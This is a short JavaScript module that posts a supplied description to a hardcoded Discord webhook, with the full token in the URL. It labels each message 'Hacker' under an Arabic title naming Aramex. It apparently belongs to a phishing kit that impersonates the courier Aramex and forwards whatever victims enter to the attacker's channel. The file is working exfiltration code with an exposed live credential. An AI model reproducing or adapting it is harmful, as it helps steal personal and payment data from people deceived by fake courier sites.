import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1326492853358166049/6HyWiwVk-nDoHuxQJFStw6P1pHV7AZJt8_itruFgSwziskmeJRDQlVbvCJzUosqIulVy",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
